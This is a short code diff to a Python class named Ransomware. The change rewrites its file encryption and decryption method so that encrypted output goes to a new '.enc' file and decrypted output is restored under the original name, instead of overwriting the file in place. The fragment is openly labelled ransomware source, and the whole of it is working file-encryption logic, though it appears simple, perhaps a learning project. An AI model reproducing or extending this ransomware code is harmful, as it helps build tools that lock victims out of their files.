@@ -106,19 +106,25 @@ class Ransomware:
             file_path:str: Absolute path to a file 
         """
 
-        with open(file_path, 'rb+') as f:
-            _data = f.read()
 
-            if not encrypted:
-                print(f'File contents pre encryption: {_data}')
-                data = self.cryptor.encrypt(_data)
-                print(f'File contents post encryption: {data}')
-            else:
-                data = self.cryptor.decrypt(_data)
-                print(f'File content post decryption: {data}')
+        if not encrypted:
+            f = open(file_path, 'rb+')
+            _data = f.read()
+            print(f'File contents pre encryption: {_data}')
+            data = self.cryptor.encrypt(_data)
+            print(f'File contents post encryption: {data}')
+            f_enc = open(file_path + ".enc", 'wb')
+            f_enc.write(data)           
+        else:
+            f = open(file_path, 'rb+')
+            _data = f.read()
+            data = self.cryptor.decrypt(_data)
+            print(f'File content post decryption: {data}')
+            f_dec = open(file_path.replace(".enc",""), 'wb')
+            f_dec.write(data)
 
             #f.seek(0)
-            f.write(data)
+            #f.write(data)
 
 
 
